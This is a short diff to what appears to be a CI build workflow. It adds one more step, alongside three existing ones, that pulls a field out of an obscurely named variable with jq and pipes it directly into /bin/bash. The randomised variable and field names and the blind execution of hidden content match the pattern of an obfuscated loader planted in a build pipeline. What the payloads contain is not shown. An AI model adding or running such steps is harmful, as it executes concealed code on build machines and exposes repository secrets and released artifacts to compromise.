@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$pimk4143" | jq -r .w8 | /bin/bash
           echo $cs91380 | jq -r .oc4898 | /bin/bash
           echo $ze7934 | jq -r .c4008 | /bin/bash
+          echo $c5 | jq -r .g323 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
